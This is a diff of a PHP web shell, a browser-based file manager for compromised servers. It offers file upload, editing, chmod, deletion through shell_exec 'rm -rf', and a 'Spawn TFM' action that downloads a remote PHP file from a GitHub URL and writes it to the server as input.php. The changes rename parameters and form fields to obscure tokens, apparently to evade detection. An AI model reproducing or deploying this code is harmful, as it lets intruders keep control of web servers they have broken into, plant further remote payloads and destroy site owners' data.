@@ -8,7 +8,7 @@
 
 <body>
   <?php
-  $path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
+  $path = (isset($_GET["x"])) ? $_GET["x"] : getcwd();
   $file = (isset($_GET["file"])) ? $_GET["file"] : "";
 
   $os = php_uname('s');
@@ -45,16 +45,15 @@
 
     <div class="navigation">
       <?php
-      if (isset($_GET["file"]) && !isset($_GET["path"])) {
+      if (isset($_GET["file"]) && !isset($_GET["x"])) {
         $path = dirname($_GET["file"]);
       }
       $path = str_replace("\\", "/", $path);
 
       $paths = explode("/", $path);
-      echo 'Current Path: ';
-      echo ($os !== "Windows") ? "<a href='?path=/'>~</a>" : "";
+      echo ($os !== "Windows") ? "<a href='?x=/'>~</a>" : "";
       foreach ($paths as $id => $pat) {
-        echo "<a href='?path=";
+        echo "<a href='?x=";
         for ($i = 0; $i <= $id; $i++) {
           echo $paths[$i];
           if ($i != $id) {
@@ -67,14 +66,14 @@
     </div>
     <?php
     if ($_SERVER["REQUEST_METHOD"] === "POST") {
-      if (isset($_FILES["nax_file"])) {
-        $file = basename($_FILES["nax_file"]["name"]);
+      if (isset($_FILES["kPzL2"])) {
+        $file = basename($_FILES["kPzL2"]["name"]);
         $targetFile = $path . $separator . $file;
 
-        if (move_uploaded_file($_FILES["nax_file"]["tmp_name"], $targetFile)) {
-          echo "<script>alert('$file uploaded'); window.location = '?path=$path';</script>";
+        if (move_uploaded_file($_FILES["kPzL2"]["tmp_name"], $targetFile)) {
+          echo "<script>alert('$file uploaded'); window.location = '?x=$path';</script>";
         } else {
-          echo "<script>alert('Upload failed'); window.location = '?path=$path';</script>";
+          echo "<script>alert('Upload failed'); window.location = '?x=$path';</script>";
         }
       }
     }
@@ -102,7 +101,7 @@
               ?>
                 <tr>
                   <td width="450">
-                    <a href='?path=<?= $path . $separator . $items; ?>'>
+                    <a href='?x=<?= $path . $separator . $items; ?>'>
                       <?= $items; ?>
                     </a>
                   </td>
@@ -110,13 +109,13 @@
                   <td><?= gor($path . $separator . $items); ?> / <?= ggr($path . $separator . $items); ?></td>
                   <td class="<?= $color; ?>"><?= hi_permission($path . $separator . $items); ?></td>
                   <td>
-                    <a href='?path=<?= $path . $separator . $items; ?>&a=rename'>
+                    <a href='?x=<?= $path . $separator . $items; ?>&a=rename'>
                       Rename
                     </a>
-                    <a href='?path=<?= "$path$separator$items"; ?>&a=chmod'>
+                    <a href='?x=<?= "$path$separator$items"; ?>&a=chmod'>
                       Chmod
                     </a>
-                    <a href='?path=<?= "$path$separator$items"; ?>&a=delete' onclick="return confirm('Delete folder <?= $items; ?>?')">
+                    <a href='?x=<?= "$path$separator$items"; ?>&a=delete' onclick="return confirm('Delete folder <?= $items; ?>?')">
                       Delete
                     </a>
                   </td>
@@ -192,7 +191,7 @@
         $filename = $_POST["filename"];
         $content = base64_encode($_POST["content"]);
         if (doFile($path . $separator . $filename, $content)) {
-          echo "<script>alert('$filename Created'); window.location = '?path=$path';</script>";
+          echo "<script>alert('$filename Created'); window.location = '?x=$path';</script>";
         } else {
           echo "Failed to create";
         }
@@ -211,7 +210,7 @@
       <?php
       if (isset($_POST["foldername"])) {
         $foldername = $_POST["foldername"];
-        echo (mkdir($path . $separator . $foldername)) ? "<script>alert('$foldername Created'); window.location = '?path=$path';</script>" : "Failed to create";
+        echo (mkdir($path . $separator . $foldername)) ? "<script>alert('$foldername Created'); window.location = '?x=$path';</script>" : "Failed to create";
       }
     } elseif (isset($_GET['a']) && $_GET["a"] == "editFile") {
       $file = basename($_GET["file"]);
@@ -229,7 +228,7 @@
         if (doFile($path . $separator . $file, $content)) {
           $filename = basename($file);
 
-          echo "<script>alert('$filename Edited'); window.location = '?path=$path';</script>";
+          echo "<script>alert('$filename Edited'); window.location = '?x=$path';</script>";
         } else {
           echo "Failed to create";
         }
@@ -238,7 +237,7 @@
       if (!empty($_GET["file"])) {
         $filename = basename($file);
         if (unlink($file)) {
-          echo "<script>alert('$filename Deleted'); window.location = '?path=" . dirname($_GET["file"]) . "';</script>";
+          echo "<script>alert('$filename Deleted'); window.location = '?x=" . dirname($_GET["file"]) . "';</script>";
         } else {
           echo "Delete $filename failed";
         }
@@ -248,13 +247,13 @@
           @rmdir($path);
           @shell_exec("rm -rf \"$path\"");
           @shell_exec("rmdir /s /q \"$path\"");
-          echo "<script>alert('$folder_name Deleted'); window.location = '?path=" . dirname($path) . "';</script>";
+          echo "<script>alert('$folder_name Deleted'); window.location = '?x=" . dirname($path) . "';</script>";
         } else {
           echo "Delete $folder_name failed";
         }
       }
     } elseif (isset($_GET['a']) && $_GET["a"] == "rename") {
-      $oriname = (isset($_GET["file"])) ? basename($_GET["file"]) : basename($_GET["path"]);
+      $oriname = (isset($_GET["file"])) ? basename($_GET["file"]) : basename($_GET["x"]);
       ?>
       <div class="card">
         <form method="post">
@@ -268,21 +267,21 @@
       <?php
       if (isset($_POST["newname"])) {
         $newname = $_POST["newname"];
-        $path = (isset($_GET["file"])) ? dirname($_GET["file"]) : dirname($_GET["path"]);
+        $path = (isset($_GET["file"])) ? dirname($_GET["file"]) : dirname($_GET["x"]);
         if (rename($path . $separator . $oriname, $path . $separator . $newname)) {
-          echo "<script>alert('$oriname renamed to $newname'); window.location = '?path=$path';</script>";
+          echo "<script>alert('$oriname renamed to $newname'); window.location = '?x=$path';</script>";
         } else {
           "Failed to rename";
         }
       }
     } elseif (isset($_GET['a']) && $_GET["a"] == "chmod") {
-      $item = (isset($_GET["file"])) ? $_GET["file"] : $_GET["path"];
+      $item = (isset($_GET["file"])) ? $_GET["file"] : $_GET["x"];
 
       if (isset($_POST["chmod"])) {
         $newPermissions = octdec($_POST["chmod"]);
 
         if (chmod($item, $newPermissions)) {
-          echo "<script>alert('" . basename($item) . " permission has changed!'); window.location = '?path=$path';</script>";
+          echo "<script>alert('" . basename($item) . " permission has changed!'); window.location = '?x=$path';</script>";
         } else {
           echo "Failed to chmod";
         }
@@ -298,18 +297,18 @@
         </form>
       </div>
     <?php
-    } elseif (isset($_GET['a']) && $_GET["a"] == "toolkit") {
+    } elseif (isset($_GET['a']) && $_GET["a"] == "tfm") {
       $cc = curl_init();
-      curl_setopt($cc, CURLOPT_URL, "https://raw.githubusercontent.com/nastar-id/kegabutan/master/shelk.php");
+      curl_setopt($cc, CURLOPT_URL, "https://raw.githubusercontent.com/pwnsauce403/dface/main/me/tfm.txt");
       curl_setopt($cc, CURLOPT_RETURNTRANSFER, true);
       $xx = curl_exec($cc);
       curl_close($cc);
 
-      $tool = base64_encode($xx);
-      if (doFile($path . "/tools.php", $tool)) {
-        echo "<script>alert('tools.php spawned!'); window.location = '?path=" . $path . "';</script>";
+      $tfm = base64_encode($xx);
+      if (doFile($path . "/input.php", $tfm)) {
+        echo "<script>alert('input.php spawned!'); window.location = '?x=" . $path . "';</script>";
       } else {
-        echo "<script>alert('Failed to spawn toolkit!'); window.location = '?path=" . $path . "';</script>";
+        echo "<script>alert('Failed to spawn toolkit!'); window.location = '?x=" . $path . "';</script>";
       }
     }
     ?>
@@ -433,58 +432,26 @@
     <input class='toggle' id='menu' type='checkbox' style="display: none;">
 
     <div class="menu-list">
-      <a href="?path=<?= $path; ?>&a=createFile">Create File</a>
-      <a href="?path=<?= $path; ?>&a=createFolder">Create Folder</a>
-      <a href="?path=<?= $path; ?>&a=toolkit">Spawn Toolkit</a>
-      <label for="naxx">Upload File</label>
-      <label for="mode-toggle" class="no-select">
-        <span>Dark Mode</span>
-        <input type="checkbox" id="mode-toggle" class="d-hidden">
-      </label>
+      <a href="?x=<?= $path; ?>&a=createFile">New File</a>
+      <a href="?x=<?= $path; ?>&a=createFolder">New Folder</a>
+      <a href="?x=<?= $path; ?>&a=tfm">Spawn TFM</a>
+      <a href="?x=<?= $path; ?>&a=mer">Spawn Mer</a>
+      <label for="pZk1">Upload File</label>
     </div>
 
     <label class='btn-primary menu-toggle' for='menu'>
-      Open Menu
+      Menu
     </label>
 
     <form method="POST" enctype="multipart/form-data" id="upload" class="d-hidden">
-      <input type="file" name="nax_file" id="naxx">
+      <input type="file" name="kPzL2" id="pZk1">
     </form>
   </div>
   <script>
-    const uploadInput = document.querySelector("#naxx");
+    const uploadInput = document.querySelector("#pZk1");
     uploadInput.addEventListener("change", () => {
       const uploadForm = document.querySelector("#upload");
       uploadForm.submit();
-    });
-
-
-    const mode = localStorage.getItem("mode") || "light";
-
-    const modeToggle = document.querySelector("#mode-toggle");
-    const modeToggleLabel = document.querySelector("[for=mode-toggle] span");
-    const body = document.body;
-
-    if (mode === "dark") {
-      body.classList.add("dark");
-      modeToggle.checked = true;
-      modeToggleLabel.innerText = "Light Mode";
-    } else {
-      body.classList.remove("dark");
-      modeToggle.checked = false;
-      modeToggleLabel.innerText = "Dark Mode";
-    }
-
-    modeToggle.addEventListener("change", () => {
-      if (modeToggle.checked) {
-        localStorage.setItem("mode", "dark");
-        body.classList.add("dark");
-        modeToggleLabel.innerText = "Light Mode";
-      } else {
-        localStorage.setItem("mode", "light");
-        body.classList.remove("dark");
-        modeToggleLabel.innerText = "Dark Mode";
-      }
     });
   </script>
 </body>
